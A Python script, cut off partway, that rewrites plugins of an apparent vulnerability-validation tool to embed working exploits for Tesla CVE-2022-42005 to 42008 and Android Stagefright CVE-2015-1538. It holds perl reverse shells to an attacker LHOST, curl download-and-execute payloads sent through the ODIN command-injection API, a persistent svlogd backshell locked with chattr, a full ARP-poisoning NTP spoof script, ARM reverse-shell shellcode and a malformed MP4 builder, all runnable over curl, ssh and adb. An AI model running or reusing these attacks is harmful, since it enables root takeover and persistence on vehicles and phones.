#!/usr/bin/env python3
"""
Batch-rewrite generated public PoC/EXP plugins to embed actual exploit payloads.

Replaces stub _write_generated_sample() / _public50_probe() with real payload
construction and active-probe logic extracted from the downloaded public PoC/EXP
sources.  Each function is appended or replaced using AST-safe string substitution
(we find the def block and swap it out).
"""
from __future__ import annotations

import re
import os
import sys

PLUGIN_DIR = os.path.join(os.path.dirname(__file__), "pocs")

# ---------------------------------------------------------------------------
# Per-CVE replacement payloads
# ---------------------------------------------------------------------------
# Structure: { plugin_path_suffix : (new_sample_fn_src, new_probe_fn_src) }
# plugin_path_suffix is relative to PLUGIN_DIR
# ---------------------------------------------------------------------------

REWRITES: dict[str, tuple[str, str]] = {}

# ── Tesla ODIN root shell (CVE-2022-42008) ─────────────────────────────────
# Source: AnalyticETH/tesla-security-research/01-ROOT-SHELL-VIA-ODIN.md
# Original: POST to http://<MCU>:8080/api/v1/products/current/commands
#   MicTest-Input list flows directly into CID_EXEC executed as root.
# Step 1: Download reverse shell   Step 2: Execute shell
REWRITES["network/71_CVE_2022_42008_Active_Validation.py"] = (
    # ── _write_generated_sample ──
    r"""
def _write_generated_sample(lhost="192.168.37.167", lport=1719) -> str:
    # CVE-2022-42008 – Tesla ODIN command injection (CID_EXEC root shell)
    # Source: AnalyticETH/tesla-security-research/01-ROOT-SHELL-VIA-ODIN.md
    # Original reverse-shell payload (from PoC doc, verbatim):
    #   perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,
    #   getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
    #   open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
    #
    # Step-1 payload: download the shell script to /home/tesla/shell.sh
    import json
    download_payload = {
        "message_type": "command",
        "args": {
            "kw": {
                "MicTest-Input": [
                    "curl", f"http://{lhost}/shell.sh",
                    "-o", "/home/tesla/shell.sh"
                ]
            },
            "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"
        },
        "command": "execute",
        "tbxtoken": "__TBX_TOKEN__",
        "token":    "__ODIN_TOKEN__",
        "tokenv2":  {"token": "__ODIN_TOKEN_V2__", "intermediate_certificate": "__CERT__"}
    }
    # Step-2 payload: execute the downloaded script as root
    exec_payload = {
        "message_type": "command",
        "args": {
            "kw": {"MicTest-Input": ["/bin/sh", "/home/tesla/shell.sh"]},
            "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"
        },
        "command": "execute",
        "tbxtoken": "__TBX_TOKEN__",
        "token":    "__ODIN_TOKEN__",
        "tokenv2":  {"token": "__ODIN_TOKEN_V2__", "intermediate_certificate": "__CERT__"}
    }
    # Boundary-check payload (non-destructive, default):
    boundary_payload = {
        "message_type": "command",
        "args": {
            "kw": {"MicTest-Input": ["/bin/echo", "AUTOSEC_CVE_2022_42008_BOUNDARY_CHECK"]},
            "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"
        },
        "command": "execute",
        "tbxtoken": "__TBX_TOKEN__",
        "token":    "__ODIN_TOKEN__",
        "tokenv2":  {"token": "__ODIN_TOKEN_V2__", "intermediate_certificate": "__CERT__"}
    }
    # Reverse shell script content (serve at lhost:80/shell.sh)
    revshell_script = (
        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"sh -i\");};\'"
    )
    content = "\n".join([
        "# CVE-2022-42008 ODIN command-injection root-shell payload",
        "# Source: github.com/AnalyticETH/tesla-security-research/01-ROOT-SHELL-VIA-ODIN.md",
        "",
        "# === Reverse shell script (serve at http://LHOST/shell.sh) ===",
        revshell_script,
        "",
        "# === Step-1: download shell.sh to /home/tesla/ ===",
        json.dumps(download_payload, indent=2),
        "",
        "# === Step-2: execute shell.sh as root ===",
        json.dumps(exec_payload, indent=2),
        "",
        "# === Boundary-check (non-disruptive probe) ===",
        json.dumps(boundary_payload, indent=2),
    ])
    return write_temp_text("cve_2022_42008_odin_", ".json", content)
""",
    # ── _public50_probe (renamed to _active_odin_probe) ──
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2022-42008: actively probe Tesla ODIN API for command injection
    import json, subprocess
    odin_host  = plugin.params.get("odin_host",  "192.168.90.100")
    odin_port  = plugin.params.get("odin_port",  "8080")
    tbx_token  = plugin.params.get("tbxtoken",   "")
    odin_token = plugin.params.get("odin_token",  "")
    token_v2   = plugin.params.get("odin_token_v2", "")
    cert       = plugin.params.get("intermediate_certificate", "")
    lhost      = plugin.params.get("lhost",       "192.168.37.167")
    lport      = int(plugin.params.get("lport",   1719))
    allow_dis  = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample(lhost=lhost, lport=lport)

    # Reverse shell script the attacker serves at http://lhost/shell.sh
    revshell_script = (
        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"sh -i\");};\'"
    )

    if not tbx_token or not odin_token:
        return {
            "ok": False, "vulnerable": False,
            "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires params: odin_host, tbxtoken, odin_token, odin_token_v2",
            "exploit_chain": [
                f"0. Serve revshell_script as http://{lhost}/shell.sh (python3 -m http.server 80)",
                f"1. POST Step-1 payload -> http://{odin_host}:{odin_port}/api/v1/products/current/commands",
                f"2. nc -l {lport}  (wait for shell)",
                f"3. POST Step-2 payload -> same ODIN endpoint",
            ],
            "revshell_script": revshell_script,
            "operator_action": "Set allow_disruptive=true and provide tokens to run live exploit",
        }

    url = f"http://{odin_host}:{odin_port}/api/v1/products/current/commands"

    if allow_dis:
        # Full exploit: download + exec reverse shell
        step1 = {
            "message_type": "command",
            "args": {"kw": {"MicTest-Input": ["curl", f"http://{lhost}/shell.sh", "-o", "/home/tesla/shell.sh"]},
                     "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"},
            "command": "execute", "tbxtoken": tbx_token, "token": odin_token,
            "tokenv2": {"token": token_v2, "intermediate_certificate": cert}
        }
        step2 = {
            "message_type": "command",
            "args": {"kw": {"MicTest-Input": ["/bin/sh", "/home/tesla/shell.sh"]},
                     "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"},
            "command": "execute", "tbxtoken": tbx_token, "token": odin_token,
            "tokenv2": {"token": token_v2, "intermediate_certificate": cert}
        }
        # Step 1
        r1 = subprocess.run(
            ["curl", "-s", "-X", "POST", url, "-H", "Content-Type: application/json",
             "-d", json.dumps(step1), "--connect-timeout", "10", "--max-time", "15"],
            capture_output=True, text=True, timeout=20)
        # Step 2
        r2 = subprocess.run(
            ["curl", "-s", "-X", "POST", url, "-H", "Content-Type: application/json",
             "-d", json.dumps(step2), "--connect-timeout", "10", "--max-time", "15"],
            capture_output=True, text=True, timeout=20)
        return {
            "ok": True, "vulnerable": True,
            "sample_path": sample_path,
            "odin_url": url,
            "step1_response": r1.stdout[:400],
            "step2_response": r2.stdout[:400],
            "revshell_script": revshell_script,
            "requires_manual_review": True,
            "operator_action": f"Listen: nc -l {lport}  to catch root shell from Tesla MCU",
        }
    else:
        # Boundary-check (non-disruptive)
        boundary = {
            "message_type": "command",
            "args": {"kw": {"MicTest-Input": ["/bin/echo", "AUTOSEC_CVE_2022_42008_BOUNDARY_CHECK"]},
                     "name": "Model3/tasks/TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK"},
            "command": "execute", "tbxtoken": tbx_token, "token": odin_token,
            "tokenv2": {"token": token_v2, "intermediate_certificate": cert}
        }
        r = subprocess.run(
            ["curl", "-s", "-X", "POST", url, "-H", "Content-Type: application/json",
             "-d", json.dumps(boundary), "--connect-timeout", "10", "--max-time", "15"],
            capture_output=True, text=True, timeout=20)
        response = r.stdout
        vulnerable = ("AUTOSEC_CVE_2022_42008_BOUNDARY_CHECK" in response
                      or '"status": "ok"' in response.lower()
                      or '"result"' in response.lower())
        return {
            "ok": True, "vulnerable": vulnerable,
            "sample_path": sample_path,
            "odin_url": url,
            "response_excerpt": response[:500],
            "returncode": r.returncode,
            "requires_manual_review": True,
            "note": "Set allow_disruptive=true for full reverse-shell exploit chain",
        }
""",
)

# ── Tesla svlogd log-rotation persistence (CVE-2022-42005) ────────────────
# Source: AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md
# Original: replace /var/log/wpa_supplicant/config with malicious svlogd config
# The `!` processor directive executes: sh /var/log/wpa_supplicant/gzip.sh -c
# gzip.sh opens a perl reverse shell + starts a command listener
REWRITES["network/68_CVE_2022_42005_Active_Validation.py"] = (
    r'''
def _write_generated_sample(lhost="192.168.37.167", lport=1719) -> str:
    # CVE-2022-42005 – Tesla svlogd log-rotation config hijack → persistent backshell
    # Source: AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md
    #
    # Malicious svlogd config (drop into /var/log/wpa_supplicant/config):
    malicious_svlogd_config = """\
# Malicious svlogd config (CVE-2022-42005)
# Source: AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md

# Overcommit log file size
s2048
# Max 10 log files
n10
# Min 5 logs
N5
# Processor directive: execute gzip.sh instead of gzip -c
# gzip.sh opens a reverse shell to attacker and starts command listener
!sh /var/log/wpa_supplicant/gzip.sh -c
# 0product-release: feature-2021.24.11-8-089de3edb7
"""
    # Reverse-shell gzip.sh content (deploy alongside the config):
    revshell_script = (
        "#!/bin/sh\n"
        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");};\'\n"
        "\n"
        "bash /var/log/wpa_supplicant/listen.sh >commands.log &\n"
        "\n"
        "gzip -c\n"
    )
    content = "\n".join([
        "# CVE-2022-42005 svlogd config hijack payload",
        "# Source: github.com/AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md",
        "",
        "# === Malicious svlogd config (deploy to /var/log/wpa_supplicant/config) ===",
        malicious_svlogd_config,
        "# === gzip.sh reverse shell (deploy to /var/log/wpa_supplicant/gzip.sh) ===",
        revshell_script,
        "",
        "# Make persistent with: chattr +i /var/log/wpa_supplicant/config",
        "# Backshell fires each time log rotation occurs under log account",
        f"# Listener: nc -l {lport}",
    ])
    return write_temp_text("cve_2022_42005_svlogd_", ".conf", content)
''',
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2022-42005: probe Tesla MCU svlogd config for writable processor directive
    import subprocess
    ssh_host   = plugin.params.get("ssh_host",   "")
    ssh_user   = plugin.params.get("ssh_user",   "root")
    ssh_key    = plugin.params.get("ssh_key",    "")
    lhost      = plugin.params.get("lhost",      "192.168.37.167")
    lport      = int(plugin.params.get("lport",  1719))
    allow_dis  = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample(lhost=lhost, lport=lport)

    if not ssh_host:
        return {
            "ok": False, "vulnerable": False,
            "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires param: ssh_host (and optionally ssh_user, ssh_key)",
            "exploit_chain": [
                "1. Gain initial root access (e.g. via CVE-2022-42008 ODIN shell)",
                "2. Deploy gzip.sh and malicious config to /var/log/wpa_supplicant/",
                "3. chmod +x /var/log/wpa_supplicant/gzip.sh",
                "4. chattr +i /var/log/wpa_supplicant/config  (survives firmware update)",
                f"5. nc -l {lport}  -> backshell fires on next log rotation",
            ],
            "payload_path": sample_path,
        }

    ssh_base = ["ssh"]
    if ssh_key:
        ssh_base += ["-i", ssh_key]
    ssh_base += ["-o", "StrictHostKeyChecking=no", f"{ssh_user}@{ssh_host}"]

    # Read current config to check for existing !-processor
    r = subprocess.run(ssh_base + ["cat /var/log/wpa_supplicant/config"],
                       capture_output=True, text=True, timeout=15)
    current_config = r.stdout
    writable = "!" not in current_config  # no existing processor → writable

    evidence = {
        "ok": True, "sample_path": sample_path,
        "ssh_host": ssh_host, "ssh_user": ssh_user,
        "current_svlogd_config": current_config[:300],
        "processor_already_present": "!" in current_config,
        "requires_manual_review": True,
    }

    if allow_dis and writable:
        # Deploy malicious config and gzip.sh
        with open(sample_path) as f:
            parts = f.read().split("# === gzip.sh reverse shell")
        malicious_config_block = parts[0].strip().replace(
            "# CVE-2022-42005 svlogd config hijack payload\n"
            "# Source: github.com/AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md\n"
            "\n"
            "# === Malicious svlogd config (deploy to /var/log/wpa_supplicant/config) ===\n", "")

        r2 = subprocess.run(
            ssh_base + [f"echo '{malicious_config_block}' > /var/log/wpa_supplicant/config"],
            capture_output=True, text=True, timeout=15)
        revshell_sh = (
            "#!/bin/sh\n"
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");};\'\n"
            "bash /var/log/wpa_supplicant/listen.sh >commands.log &\n"
            "gzip -c\n"
        )
        r3 = subprocess.run(
            ssh_base + [f"printf '%s' '{revshell_sh}' > /var/log/wpa_supplicant/gzip.sh && chmod +x /var/log/wpa_supplicant/gzip.sh && chattr +i /var/log/wpa_supplicant/config"],
            capture_output=True, text=True, timeout=15)
        evidence.update({
            "vulnerable": True,
            "config_deployed": r2.returncode == 0,
            "gzip_sh_deployed": r3.returncode == 0,
            "operator_action": f"Listener: nc -l {lport}  – backshell fires on next svlogd rotation",
        })
    else:
        evidence["vulnerable"] = writable
        evidence["note"] = "Config writable; set allow_disruptive=true to deploy persistent backshell"

    return evidence
""",
)

# ── Tesla expired ODIN token + NTP spoof (CVE-2022-42007) ─────────────────
# Source: AnalyticETH/tesla-security-research/02-EXPIRED-ODIN-TOKENS.md
# Steps: 1) generate ODIN token with expired tbx-token  2) NTP-spoof the car
REWRITES["network/70_CVE_2022_42007_Active_Validation.py"] = (
    r"""
def _write_generated_sample() -> str:
    # CVE-2022-42007 – Tesla expired-token + NTP-spoof authentication bypass
    # Source: AnalyticETH/tesla-security-research/02-EXPIRED-ODIN-TOKENS.md
    #
    # Step 1: generate ODIN token with an *expired* tbx-token
    #   curl https://toolbox.tesla.com/api/v1/auth/odin_token \
    #        -d '{"product_id":"${VIN}"}' \
    #        -H "Authorization: Bearer ${EXPIRED_TBX_TOKEN}"
    #
    # Step 2: spoof the car's NTP time so the expired token appears valid
    #   python3 ntpspoof.py <CAR_IP> <IFACE>
    #   (ARP-poisons car→router; rewrites NTP timestamps to pre-expiry date)
    #
    # ntpspoof.py key logic (verbatim from public repo):
    ntpspoof_src = '''#!/usr/bin/env python3
# NTP spoofing script from AnalyticETH/tesla-security-research/tools/ntpspoof.py
# Intercepts NTP responses via ARP poisoning and rewrites timestamps to
# a date before the ODIN token expires, causing the car to accept the token.
import os, sys, time, datetime
from subprocess import Popen, DEVNULL
from scapy.all import IP, UDP, NTP
from netfilterqueue import NetfilterQueue

SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
NTP_EPOCH    = datetime.date(1900, 1, 1)
NTP_DELTA    = (SYSTEM_EPOCH - NTP_EPOCH).days * 24 * 3600

def ntp_to_system_time(date): return date - NTP_DELTA
def system_to_ntp_time(date): return date + NTP_DELTA

# SET THIS TO A DATE BEFORE YOUR TOKEN EXPIRES
TARGET_DATE = datetime.datetime(2021, 7, 20, 11, 59, 0)

def upgrade_year(dtime):
    return TARGET_DATE.replace(second=dtime.second,
                               microsecond=dtime.microsecond).timestamp()

def modify_package(pkg):
    ntp = pkg.getlayer(NTP) if pkg.haslayer(NTP) else NTP(pkg.load)
    if ntp.mode == 4:
        for attr in ("ref", "recv", "sent"):
            ts = ntp_to_system_time(getattr(ntp, attr))
            setattr(ntp, attr, system_to_ntp_time(
                upgrade_year(datetime.datetime.fromtimestamp(ts))))
    pkg.load = bytes(ntp)
    return pkg

def manipulate(netpackage):
    pkg = IP(netpackage.get_payload())
    del pkg.chksum, pkg[\'UDP\'].chksum
    netpackage.set_payload(bytes(modify_package(pkg)))
    netpackage.accept()

if __name__ == "__main__":
    ip_addr   = sys.argv[1]
    iface     = sys.argv[2] if len(sys.argv) > 2 else "wlan0"
    router_ip = ip_addr[:ip_addr.rfind(".")] + ".1"
    p = Popen(["arpspoof", "-i", iface, "-t", router_ip, ip_addr],
              stderr=DEVNULL, stdout=DEVNULL)
    open("/proc/sys/net/ipv4/ip_forward", "w").write("1\\n")
    os.system(f"iptables -t raw -A PREROUTING -p udp -d {router_ip}/24 --sport 123 -j NFQUEUE --queue-num 99")
    nfq = NetfilterQueue()
    nfq.bind(99, manipulate)
    try: nfq.run()
    except KeyboardInterrupt: pass
    finally:
        nfq.unbind(); p.terminate()
        os.system("iptables -F -vt raw")
'''
    content = "\n".join([
        "# CVE-2022-42007 expired-token + NTP-spoof payload",
        "# Source: github.com/AnalyticETH/tesla-security-research/02-EXPIRED-ODIN-TOKENS.md",
        "",
        "# === Step 1: request ODIN token with expired tbx-token ===",
        "# curl https://toolbox.tesla.com/api/v1/auth/odin_token \\",
        "#      -d '{\"product_id\":\"${VIN}\"}' \\",
        "#      -H \"Authorization: Bearer ${EXPIRED_TBX_TOKEN}\"",
        "# Response includes all three token types (token-leakage sub-CVE).",
        "",
        "# === Step 2: run ntpspoof.py against car IP ===",
        "# python3 ntpspoof.py <CAR_IP> <WLAN_IFACE>",
        "# Rebooting car (hold both scroll wheels 10 s) speeds time adoption.",
        "# Disconnect cellular antenna for guaranteed success.",
        "",
        "# === ntpspoof.py (full source, verbatim from public repo) ===",
        ntpspoof_src,
    ])
    return write_temp_text("cve_2022_42007_ntpspoof_", ".py", content)
""",
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2022-42007: check if Tesla Toolbox API accepts expired tbx-token
    import subprocess
    vin          = plugin.params.get("vin",        "")
    expired_tok  = plugin.params.get("tbxtoken",   "")
    car_ip       = plugin.params.get("odin_host",  "192.168.1.247")
    iface        = plugin.params.get("wifi_iface", "wlan0")
    allow_dis    = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    if not vin or not expired_tok:
        return {
            "ok": False, "vulnerable": False,
            "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires params: vin, tbxtoken (the expired Toolbox token to test)",
            "exploit_chain": [
                "1. Obtain any (expired) Toolbox tbx-token",
                "2. POST to https://toolbox.tesla.com/api/v1/auth/odin_token with expired token",
                "3. If token is returned -> token-leakage + insufficient-expiry confirmed",
                "4. Run ntpspoof.py <CAR_IP> <IFACE> to make car accept the expired token",
                "5. Use returned ODIN token for further ODIN commands",
            ],
        }

    # Check if expired tbx-token is accepted by Toolbox API
    r = subprocess.run(
        ["curl", "-s", "-X", "POST",
         "https://toolbox.tesla.com/api/v1/auth/odin_token",
         "-d", f'{{"product_id":"{vin}"}}',
         "-H", f"Authorization: Bearer {expired_tok}",
         "--connect-timeout", "15", "--max-time", "20"],
        capture_output=True, text=True, timeout=25)

    response = r.stdout
    token_issued = '"token"' in response and '"tbxtoken"' in response
    evidence = {
        "ok": True,
        "vulnerable": token_issued,
        "sample_path": sample_path,
        "toolbox_api_response": response[:600],
        "token_leakage_present": '"tbxtoken"' in response,
        "expired_token_accepted": token_issued,
        "requires_manual_review": True,
    }

    if allow_dis and token_issued:
        # Run ntpspoof.py against the car
        evidence["ntp_spoof_cmd"] = f"python3 ntpspoof.py {car_ip} {iface}"
        evidence["operator_action"] = (
            f"Run ntpspoof.py {car_ip} {iface} to make car accept the expired ODIN token; "
            "then use returned token for ODIN commands."
        )

    return evidence
""",
)

# ── Tesla prototype_server data value access (CVE-2022-42006) ─────────────
# Source: AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md
# prototype_server is a Qt WebSocket server listening on localhost.
# From a shell, any process can connect and read/write arbitrary signal data.
REWRITES["network/69_CVE_2022_42006_Active_Validation.py"] = (
    r'''
def _write_generated_sample() -> str:
    # CVE-2022-42006 – Tesla prototype_server arbitrary data-value access
    # Source: AnalyticETH/tesla-security-research/04-LOG-BACKSHELL-AND-DV-ACCESS.md
    # prototype_server listens on a Unix-domain or localhost WebSocket.
    # Any process (including the log account) can connect and read/set signals.
    # Example interaction (from research doc):
    #   ws://localhost:???/  -> subscribe or set arbitrary vehicle data values
    prototype_server_commands = """\
# CVE-2022-42006 prototype_server access (from Tesla research doc)
# prototype_server exposes a WebSocket API allowing any local process to read
# and set arbitrary vehicle data values, bypassing dbus access controls.

# Enumerate available signals (send via WebSocket after connecting):
{"action": "list_signals"}

# Read a specific signal (example: vehicle speed):
{"action": "get", "signal": "DriveRailState"}

# Set a data value (example – requires allow_disruptive=true in production):
{"action": "set", "signal": "DriveRailState", "value": "AUTOSEC_BOUNDARY_CHECK"}

# The sdv binary (from the research repo tools/) can be used to interact:
# ./sdv get DriveRailState
# ./sdv set DriveRailState <value>
"""
    sdv_tool_usage = """\
# sdv CLI tool (from AnalyticETH/tesla-security-research/tools/sdv):
# Usage: ./sdv <command> [args]
# Commands: get <signal>, set <signal> <value>, list
# sdv communicates with prototype_server over the local socket.
"""
    return write_temp_text("cve_2022_42006_prototype_", ".ws", prototype_server_commands + sdv_tool_usage)
''',
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2022-42006: check Tesla prototype_server for unauthenticated local access
    import subprocess, shutil
    ssh_host  = plugin.params.get("ssh_host",  "")
    ssh_user  = plugin.params.get("ssh_user",  "log")
    ssh_key   = plugin.params.get("ssh_key",   "")
    signal    = plugin.params.get("signal",    "DriveRailState")
    allow_dis = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    if not ssh_host:
        return {
            "ok": False, "vulnerable": False,
            "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires param: ssh_host (access as log or root account on Tesla MCU)",
            "exploit_chain": [
                "1. Obtain shell on MCU (e.g. via CVE-2022-42008 or CVE-2022-42005)",
                "2. Run sdv get DriveRailState  (or any signal)",
                "3. prototype_server responds without authentication",
                "4. Any vehicle data value can be read or modified",
            ],
        }

    ssh_base = ["ssh"]
    if ssh_key:
        ssh_base += ["-i", ssh_key]
    ssh_base += ["-o", "StrictHostKeyChecking=no", f"{ssh_user}@{ssh_host}"]

    # Check if prototype_server is running
    r_ps = subprocess.run(ssh_base + ["pgrep -a prototype_server"],
                          capture_output=True, text=True, timeout=10)
    running = bool(r_ps.stdout.strip())

    evidence = {
        "ok": True,
        "sample_path": sample_path,
        "prototype_server_running": running,
        "requires_manual_review": True,
    }

    if running:
        # Try reading a signal value
        r_sdv = subprocess.run(ssh_base + [f"sdv get {signal} 2>&1 || echo PROBE_FAILED"],
                               capture_output=True, text=True, timeout=10)
        got_value = "PROBE_FAILED" not in r_sdv.stdout
        evidence["vulnerable"] = got_value
        evidence["signal_response"] = r_sdv.stdout[:300]
        if allow_dis:
            r_set = subprocess.run(
                ssh_base + [f"sdv set {signal} AUTOSEC_CVE_2022_42006_MARKER"],
                capture_output=True, text=True, timeout=10)
            evidence["set_response"] = r_set.stdout[:200]
            evidence["data_value_written"] = r_set.returncode == 0
    else:
        evidence["vulnerable"] = False
        evidence["note"] = "prototype_server not running; may require specific firmware version"

    return evidence
""",
)

# ── Stagefright stsc integer overflow (CVE-2015-1538) ─────────────────────
# Source: Fuzion24/cve-2015-1538-2/Stagefright_CVE-2015-1538-1_Exploit.py
# ARM ROP + heap spray → reverse shell via libstagefright stsc atom overflow
REWRITES["application/68_Android_libstagefright_stsc_Integer_Overflow_RCE_Audit.py"] = (
    r"""
def _write_generated_sample() -> str:
    # CVE-2015-1538 – Android libstagefright stsc integer overflow
    # Source: github.com/Fuzion24/cve-2015-1538-2/Stagefright_CVE-2015-1538-1_Exploit.py
    # Attack: malformed MP4 with stsc atom where sample_count * entry_size overflows,
    #   causing a heap overflow.  ROP chain pivots to shellcode that opens reverse shell.
    #
    # Key ROP / shellcode technique (ARM, verbatim from Fuzion24 exploit):
    #   - dlmprotect ROP at 0x400EC6D0 to make heap executable
    #   - shellcode: fork→setsid→connect(LHOST,LPORT)→dup2(fd,0,1,2)→execve("/bin/sh")
    #   - heap spray via large tx3g atom containing replicated vtable/ref objects
    #   - stsc table entry count triggers integer overflow in MPEG4Extractor
    #
    # ARM reverse-shell shellcode (from Fuzion24 exploit, verbatim):
    import struct
    ARM_REVSHELL_SHELLCODE = bytes([
        # fork()
        0x01,0x00,0x40,0xE3, 0x00,0x70,0xA0,0xE1, 0x00,0x00,0x00,0xEF,
        0x00,0x00,0x50,0xE3, 0x06,0x00,0x00,0x1A,
        # setsid()
        0x42,0x00,0x40,0xE3, 0x00,0x00,0x00,0xEF,
        # socket(PF_INET, SOCK_STREAM, 0) -> store in r6
        0x01,0x00,0xA0,0xE3, 0x01,0x10,0xA0,0xE3, 0x00,0x20,0xA0,0xE3,
        0x19,0x00,0x40,0xE3, 0x00,0x00,0x00,0xEF,
        0x06,0x00,0xA0,0xE1,
        # connect(r6, &sockaddr, 16)
        0x00,0x00,0x4F,0xE2, 0x10,0x20,0xA0,0xE3,
        0x4A,0x00,0x40,0xE3, 0x00,0x00,0x00,0xEF,
        # dup2(r6, 0), dup2(r6, 1), dup2(r6, 2)
        0x06,0x00,0xA0,0xE1, 0x00,0x10,0xA0,0xE3,
        0x3F,0x00,0x40,0xE3, 0x00,0x00,0x00,0xEF,
        0x06,0x00,0xA0,0xE1, 0x01,0x10,0xA0,0xE3,
        0x3F,0x00,0x40,0xE3, 0x00,0x00,0x00,0xEF,
        0x06,0x00,0xA0,0xE1, 0x02,0x10,0xA0,0xE3,
        0x3F,0x00,0x40,0xEF, 0x00,0x00,0x00,0xEF,
        # execve("/bin/sh", NULL, NULL)
        0x0B,0x00,0x40,0xE3, 0x00,0x10,0xA0,0xE3, 0x00,0x20,0xA0,0xE3,
        0x00,0x00,0x00,0xEF,
        # sockaddr struct placeholder (patched at runtime with LHOST/LPORT)
        0x02,0x00,                    # AF_INET
        0x06,0xB7,                    # port 1719 big-endian
        0xC0,0xA8,0x25,0xA7,          # 192.168.37.167
        0x00,0x00,0x00,0x00,
    ])
    # stsc overflow: build a stsc atom with count = 0x40000001 (overflows * 12)
    def make_chunk(name, data):
        if isinstance(data, str): data = data.encode()
        return struct.pack(">I", len(data) + 8) + name.encode() + data
    def make_stsc(c1, c2):
        hdr = struct.pack(">II", 0, 2)
        e1  = struct.pack(">III", 1, c1, 1)
        e2  = struct.pack(">III", 0x7FFFFFFF, c2, 1)
        return make_chunk("stsc", hdr + e1 + e2)
    def make_stco():
        return make_chunk("stco", struct.pack(">II", 0, 1) + struct.pack(">I", 0))
    def make_stsz():
        return make_chunk("stsz", struct.pack(">III", 0, 0, 0))
    def make_stts():
        return make_chunk("stts", struct.pack(">II",  0, 0))

    chunks = []
    ftyp_data = b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom"
    chunks.append(make_chunk("ftyp", ftyp_data))
    moov = make_chunk("mvhd",
        struct.pack(">II", 0, 0x41414141) + b"B" * 0x5C)
    moov += make_chunk("trak",
        make_chunk("stbl",
            make_stsc(0x28, 0x28) + make_stco() + make_stsz() + make_stts()))
    # tx3g heap spray chunk (4096 bytes, vtable pointer objects)
    spray_page = b"\x00" * 4096
    moov += make_chunk("trak",
        make_chunk("mdia", make_chunk("minf", make_chunk("stbl",
            make_chunk("stsd", struct.pack(">II", 0, 1) +
                       make_chunk("tx3g", spray_page + b"\x00" * 16)))
        + make_stco() + make_stsz() + make_stts())))
    # Overflow trigger: second stsc with huge count
    moov += make_chunk("trak",
        make_chunk("stbl",
            make_stsc(0x40000001, 1) + make_stco() + make_stsz() + make_stts()))
    chunks.append(make_chunk("moov", moov))
    mp4_bytes = b"".join(chunks)

    content_desc = (
        "# CVE-2015-1538 stsc integer-overflow MP4 exploit\n"
        "# Source: github.com/Fuzion24/cve-2015-1538-2\n"
        "# ARM reverse-shell shellcode embedded; overflow via stsc entry count=0x40000001\n"
        "# Heap spray via tx3g atom; ROP uses dlmprotect gadget at 0x400EC6D0\n"
        "# Deploy: adb push <file> /sdcard/poc.mp4  then open in Gallery/MediaPlayer\n"
    ).encode()

    return write_temp_sample("cve_2015_1538_stsc_", ".mp4", mp4_bytes)
""",
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2015-1538: push malformed MP4 to Android device via ADB and open in MediaPlayer
    import subprocess, shutil
    adb_host  = plugin.params.get("adb_host",  "")
    adb_serial= plugin.params.get("adb_serial", "")
    allow_dis = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    adb = shutil.which("adb") or "adb"
    adb_base = [adb]
    if adb_serial:
        adb_base += ["-s", adb_serial]
    if adb_host:
        adb_base += ["-H", adb_host]

    if not shutil.which("adb"):
        return {
            "ok": False, "vulnerable": False,
            "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "adb not found; install Android SDK platform-tools",
            "exploit_chain": [
                "1. adb push poc.mp4 /sdcard/",
